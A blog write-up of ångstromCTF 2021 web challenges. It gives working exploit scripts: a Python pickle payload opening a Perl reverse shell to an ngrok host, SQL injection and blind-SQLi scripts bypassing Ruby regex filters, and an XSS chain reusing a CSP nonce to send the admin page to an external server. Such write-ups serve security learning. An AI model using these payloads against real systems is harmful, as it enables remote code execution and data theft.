---
layout: post
title: "ångstromCTF 2021"
date: 2021-04-08
---

<span class="align-center" markdown="1">
    <span class="categories-index">
        **Categories index**<br>
        [WEB](#web) - [Crypto](#crypto)
    </span>
</span>

---

# Web

## JAR

> My other pickle challenges seem to be giving you all a hard time, so here's a simpler one to get you warmed up.<br>Author: kmh

The link leads us to an weird webpage containing an image of a gigantic jar of pickles. We're also given the source code of the application.

```python
from flask import Flask, send_file, request, make_response, redirect
import random
import os

app = Flask(__name__)

import pickle
import base64

flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')

@app.route('/pickle.jpg')
def bg():
	return send_file('pickle.jpg')

@app.route('/')
def jar():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	return '<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">' + \
		''.join(f'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>' for item in items)

@app.route('/add', methods=['POST'])
def add():
	contents = request.cookies.get('contents')
	if contents: items = pickle.loads(base64.b64decode(contents))
	else: items = []
	items.append(request.form['item'])
	response = make_response(redirect('/'))
	response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))
	return response

app.run(threaded=True, host="0.0.0.0")
```

Given the challenge name and all those pickles, one can immediatly assume we're talking about [python's pickle module.](https://docs.python.org/3/library/pickle.html)
Particularly, the line 
```python
if contents: items = pickle.loads(base64.b64decode(contents))
```
seems interesting. If an user makes a request to the page, the application will try to get the cookie `contents` and try to deserialize it using the pickle module. Unpickling user controlled inputs is known to be dangerous hence we can try to craft a payload that, when deserialized, gives us RCE.
```python
#!/usr/bin/python
import random
import os
import pickle
import base64
import requests

# craft evil class
class Pwned:

    def __reduce__(self):
        # expose an ngrok tcp instance and wait for connection
        HOST = "6.tcp.ngrok.io"
        PORT = 14516
        # perl oneliner from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl
        return (exec, ("__import__('subprocess').Popen(['perl', '-e', 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'])" % (HOST, PORT),))

# serialize and base64 encode Pwned class 
encoded = pickle.dumps(Pwned())
contents = base64.b64encode(encoded).decode()
print("[*] Using payload %s" % contents)

# trigger remote pickle.loads with our payload
r = requests.get('https://jar.2021.chall.actf.co/', cookies={'contents' : contents}, verify=False)
```
The idea behind this attack is to use a special function `__reduce__` in our crafted `Pwned` class. In this way, when we serialize the class, the `__reduce__` function will return a tuple with a callable object and a list of arguments. When unpickled, the class will execute the callable object using the parameters provided in `__reduce__`. Learn more about [python __reduce__ function.](https://docs.python.org/3/library/pickle.html#object.__reduce__)

The solution we found it quite an overkill; when submitted, the payload triggers a reverse shell on the remote webserver. That said, we can setup a ngrok tunnel on our local machine that forwards the connections to a netcat server and get the shell.
![angstrom_ctf](/assets/img/AngstromCTF_2021/web_1.png)

🏁 __actf{you_got_yourself_out_of_a_pickle}__{:.spoiler}

## Sea of Quills

> Come check out our finest selection of quills!<br>Author: JoshDaBosh

We are given the source code of the application. 
```ruby
require 'sinatra'
require 'sqlite3'

set :bind, "0.0.0.0"
set :port, 4567

get '/' do
	db = SQLite3::Database.new "quills.db"
	@row = db.execute( "select * from quills" )

	erb :index
end

get '/quills' do
	erb :quills	
end


post '/quills' do
	db = SQLite3::Database.new "quills.db"
	cols = params[:cols]
	lim = params[:limit]
	off = params[:offset]
	
	blacklist = ["-", "/", ";", "'", "\""]
	blacklist.each { |word|
		if cols.include? word
			return "beep boop sqli detected!"
		end
	}

	if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
		return "bad, no quills for you!"
	end

	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])

	p @row
	erb :specific
end
```
We're talking about an webapp written in ruby using sinatra. The interesting stuff happens in `/quills`. As you can see, the application uses a simple `SQLite` database to query for some sort of _Sea quills_. The inputs are `cols`, `lim` and `off`, all of which form the following sql query:
```sql
select {cols} from quills limit {lim} offset {offset}
```
We can certainly control all three of the inputs, with some limitations though.
1. `cols` cannot contain word in `["-", "/", ";", "'", "\""]`
2. `lim` and `off` should <u>apparently</u> be numbers. (Why apparently ? See [part 2](#sea-of-quills-2))

At this point, let's try some SQLi injections to see if there's something hidden in the database.
Let's see what's in `sql_master`, maybe some hidden tables ? 
![angstrom_ctf](/assets/img/AngstromCTF_2021/web_2.jpeg)
```html
<ul class="list pl0">
				
    <img src="1" class="w3 h3">
    <li class="pb5 pl3"> <ul><li></li></ul></li><br />
    
    <img src="flagtable" class="w3 h3">
    <li class="pb5 pl3"> <ul><li></li></ul></li><br />
    
    <img src="quills" class="w3 h3">
    <li class="pb5 pl3"> <ul><li></li></ul></li><br />
    
</ul>
```
Bingo, we have a table named `flagtable`. I wonder what's in there.
Let's craft this payload `limit = 3`, `offset = 0`, `cols = * from flagtable union select 1`.
```html
<ul class="list pl0">
				
    <img src="1" class="w3 h3">
    <li class="pb5 pl3"> <ul><li></li></ul></li><br />
    
    <img src="actf{REDACTED}" class="w3 h3">
    <li class="pb5 pl3"> <ul><li></li></ul></li><br />
    
</ul>
```
PS: Why `* from flagtable union select 1` ? Because we know that the `quills` table has 3 columns and the `flagtable` table has 1 column hence the only way to make `union select` work is by joining together the same number of columns of both the tables. All of this because I'm lazy enough to not dump the column names of `flagtable` so by using `*` on it I have to try `union select 1, 2, 3 ...` until I get the right result.

🏁 __actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}__{:.spoiler}

## Sea of Quills 2

> A little bird told me my original quills store was vulnerable to illegal hacking! I've fixed my store now though, and now it should be impossible to hack!<br>Author: JoshDaBosh

Quills? Again ? This time the source code suggests the application is secure enough to stop us from trying random SQLi on it. We'll see.

```ruby
require 'sinatra'
require 'sqlite3'

set :server, :puma
set :bind, "0.0.0.0"
set :port, 4567
set :environment, :production

get '/' do
	db = SQLite3::Database.new "quills.db"
	@row = db.execute( "select * from quills" )

	erb :index
end

get '/quills' do
	erb :quills	
end

post '/quills' do
	db = SQLite3::Database.new "quills.db"
	cols = params[:cols]
	lim = params[:limit]
	off = params[:offset]
	
	blacklist = ["-", "/", ";", "'", "\"", "flag"]

	blacklist.each { |word|
		if cols.include? word
			return "beep boop sqli detected!"
		end
	}

	if cols.length > 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
		return "bad, no quills for you!"
	end

	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
	p @row
	erb :specific
end
```

Basically, two more checks were added: `cols` cannot contain `flag` and it cannot be longer than 24 chars. Hmm, interesting ... 
I spent a lot of time crawling SQLite's documentation in search of some exotic internal function in order to bypass the `flag` in `cols` constraint. Ah yeah, and it has to be short enough to fit `* from {encoded_flag_table_name} union select *` in 24 chars. After spending some good hours on it, I desperately started to doubt about all the checks that were applied on my input. I was naïve enough to consider that `!/^[0-9]+$/.match?(off)` as bulletproof... unless I stumbled upon [this stackoverflow post](https://stackoverflow.com/questions/577653/difference-between-a-z-and-in-ruby-regular-expressions). As I'm not very much of a ruby fan, I didn't know it uses `\A\z` in regex'es to match the whole string and by using `/^$/` it only matches until it encounters an whitespace character.
![facepalm](/assets/img/AngstromCTF_2021/web_3.webp)
With all that said, we can bypass the regex of `lim` and `off` by inserting a number followed by a newline and our payload. My final solution was to use blind SQLi to grab the flag character by character. There are more practical solutions where you can grab the entire flag in one shot but yeah, if you're brave enough to wait for a blind SQLi on a 30+ long flag, take a coffe and see the flag coming in one char at a time.

```python
#!/usr/bin/python
import requests
import urllib3
import string

index = 6
flag = 'actf{'
while 1:
    for char in '_' + string.ascii_letters + string.digits + '}':
        print("[+] Trying {}{}".format(flag, char))
        data = {
            "cols" : "desc" ,
            "limit" : "1",
            "offset" : "0\n or (select case when substr(flag,{},1)='{}' THEN 1 ELSE 0 END from flagtable)".format(index, char)
        }
        r = requests.post("https://seaofquills-two.2021.chall.actf.co/quills", data=data, verify=False)
        r = r.text
        if "it's very special" in r:
            print("[+] Found char: {}".format(char))
            flag += char
            if char == '}':
                print("[+] FLAG: {}".format(flag))
                exit()
            index += 1
            break
```
Using this approach, the offset becomes `0 or 1` = `1` only when we get the correct n-th char of the flag hence changing the offset of the query from 0 to 1 changes the ouput of the query on the page. Based on the yielded html we can check if the char we're trying is correct or if we should try the next one.

PS: the quill record with `desc = 'it's very special'` is at offset 1 so when we get it the response we know we got the correct n-th character. 

PSS: Oooor we could just use `* from fLagtable\x00` as `cols`'s param and get the flag directly. Apparently SQLite [doesn't care about case sensitivity](https://stackoverflow.com/a/153967/1923464) in table names and `\x00` truncates the query string in Ruby/SQLite.

🏁 __actf{the_time_we_have_spent_together_riding_through_this_english_denylist_c0776ee734497ca81cbd55ea}__{:.spoiler}

## nomnomnom

> I've made a new game that is sure to make all the Venture Capitalists want to invest! Care to try it out?<br>Author: paper

We are given this source code. 
```javascript
const visiter = require('./visiter');

const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');

const app = express();

app.use(bodyParser.json());
app.use(cookieParser());

app.use(express.static('public'));

const nothisisntthechallenge = crypto.randomBytes(64).toString('hex');
const shares = new Map();
shares['hint'] = {name: '<marquee>helvetica standard</marquee>', score: 42};

app.post('/record', function (req, res) {
	if (req.body.name > 100) {
		return res.status(400).send('your name is too long! we don\'t have that kind of vc investment yet...');
	}

	if (isNaN(req.body.score) || !req.body.score || req.body.score < 1) {
		res.send('your score has to be a number bigger than 1! no getting past me >:(');
		return res.status(400).send('your score has to be a number bigger than 1! no getting past me >:(');
	}

	const name = req.body.name;
	const score = req.body.score;
	const shareName = crypto.randomBytes(8).toString('hex');

	shares[shareName] = { name, score };

	return res.redirect(`/shares/${shareName}`);
})

app.get('/shares/:shareName', function(req, res) {
	// TODO: better page maybe...? would attract those sweet sweet vcbucks
	if (!(req.params.shareName in shares)) {
		return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
	}

	const share = shares[req.params.shareName];
	const score = share.score;
	const name = share.name;
	const nonce = crypto.randomBytes(16).toString('hex');
	let extra = '';

	if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {
		extra = `deletion token: <code>${process.env.FLAG}</code>`
	}

	return res.send(`
<!DOCTYPE html>
<html>
	<head>
		<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-${nonce}'">
		<title>snek nomnomnom</title>
	</head>
	<body>
		${extra}${extra ? '<br /><br />' : ''}
		<h2>snek goes <em>nomnomnom</em></h2><br />
		Check out this score of ${score}! <br />
		<a href='/'>Play!</a> <button id='reporter'>Report.</button> <br />
		<br />
		This score was set by ${name}
		<script nonce='${nonce}'>
function report() {
	fetch('/report/${req.params.shareName}', {
		method: 'POST'
	});
}

document.getElementById('reporter').onclick = () => { report() };
		</script> 
		
	</body>
</html>`);
});

app.post('/report/:shareName', async function(req, res) {
	if (!(req.params.shareName in shares)) {
		return res.status(400).send('hey that share doesn\'t exist... are you a time traveller :O');
	}

	await visiter.visit(
		nothisisntthechallenge,
		`http://localhost:9999/shares/${req.params.shareName}`
	);
})

app.listen(9999, '0.0.0.0');
```
And we also have a bot that auto-visits  webpages.
```javascript
const puppeteer = require('puppeteer')
const fs = require('fs')

async function visit(secret, url) {
	const browser = await puppeteer.launch({ args: ['--no-sandbox'], product: 'firefox' })
	var page = await browser.newPage()
	await page.setCookie({
		name: 'no_this_is_not_the_challenge_go_away',
		value: secret,
		domain: 'localhost',
		samesite: 'strict'
	})
	await page.goto(url)

	// idk, race conditions!!! :D
	await new Promise(resolve => setTimeout(resolve, 500));
	await page.close()
	await browser.close()
}

module.exports = { visit }
```

Let's try to extract the interesting lines from this source code. The logic is simple:
1. You post a JSON to `/record` with your name and score.
2. The application creates an unique `/share/:shareName` for you.
3. You can use `/report/:shareName` to report your share to the admin (the bot).

Upon reporting, the bot is going to visit your share's page. Let's look for some sort of XSS sink point. We can notice that the name we pass at `/record` is used on our share page without any particular escaping. 
```javascript
" ... This score was set by ${name} ... "
```
Also, the flag is printed on the page only if we have admin's secret cookie.
```javascript
if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) {
    extra = `deletion token: <code>${process.env.FLAG}</code>`
}
```
Finally, there is a CSP header on the page:
```html
<meta http-equiv='Content-Security-Policy' content="script-src 'nonce-${nonce}'">
```
The idea could be the following:
1. Submit an evil share containing a XSS payload in the `name` parameter
2. Report the created share to the bot
3. Use the XSS to steal the html document from the admin's browser

Let's first of all try to check what browser is used by the bot. 
By submitting the following payload we can see the bot is pinging back our webhook.
```python
# ping ngrok local instance
data = {"score" : "123", "name" : '<img src="https://8c68790a251f.ngrok.io"/>'}
```
```bash
Connection from 127.0.0.1:58110
GET / HTTP/1.1
Host: 8c68790a251f.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:9999/
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
X-Forwarded-Proto: https
X-Forwarded-For: 52.207.14.64
```

So we know the bot uses `Firefox/89.0` as a browser. Let's try some basic script injection XSS by submitting the following payload and by trying to see it in our Firefox browser.
 ```python
data = {"score" : "123", "name" : '<script>alert(1)</script>'}
```
![angstrom_ctf](/assets/img/AngstromCTF_2021/web_4.jpeg)
Hmm, seems like the CSP is blocking our script's execution. This happens because we didn't provide a valid nonce for the script tag hence the browser refuses to execute it. After some research I found [this post](https://krial057.github.io/blog/own-xss-challenge) explaining why using `<script src=//evil.com/script.js` can work in our case. Basically, as the XSS sink point is printed on the page just before the valid `<script nonce={nonce}>` tag, if we inject `<script attr=value attr=value ...` without closing the tag, firefox reuses the nonce from the script tag situated immediately after our payload.
![angstrom_ctf](/assets/img/AngstromCTF_2021/web_5.jpeg)
That's some good news for us as it gives us carte blanche on what we can execute on the bot's browser. We can use the following script to setup a form with a single input, set it's value to admin's page html document and send it back to our local server.
```python
#!/usr/bin/python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import re

data = {"score" : "123", "name" : '<form id="myform" action="https://8c68790a251f.ngrok.io/done" method="POST"><input id="myinput" name="data" value="test_value"/></form><script src="https://8c68790a251f.ngrok.io/evil.js" '}

# == Contents off evil.js ===
# document.getElementById('myinput').value = document.documentElement.innerHTML;
# document.getElementById("myform").submit();

# record score and get share token
r = requests.post('http://nomnomnom.2021.chall.actf.co/record', json=data, verify=False)
token = re.search('\/report/([a-f0-9]{16})', r.text)[0]
token = token[-16:]
print(token)

# report
r = requests.post("http://nomnomnom.2021.chall.actf.co/report/{}".format(token), verify=False)
```
![angstrom_ctf](/assets/img/AngstromCTF_2021/web_6.jpeg)
🏁 __actf{w0ah_the_t4g_n0mm3d_th1ng5}__{:.spoiler}
